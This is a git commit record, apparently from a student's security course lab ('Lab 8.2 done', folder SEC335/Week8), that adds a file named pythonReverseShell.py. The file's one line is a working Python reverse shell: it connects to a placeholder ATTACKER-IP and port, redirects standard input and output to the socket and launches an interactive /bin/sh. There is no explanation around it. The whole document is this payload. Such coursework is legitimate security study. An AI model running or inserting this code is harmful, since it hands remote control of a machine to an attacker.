d03b3f64c3c49489c0ba8ca5a4972af18387917b
cdbizzle <cole.davisbrand@mymail.champlain.edu>
2023-10-17 12:29:33 -0400

    Lab 8.2 done

---
+++ SEC335/Week8/pythonReverseShell.py
@@ -0,0 +1,2 @@
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",ATTACKER-PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
+
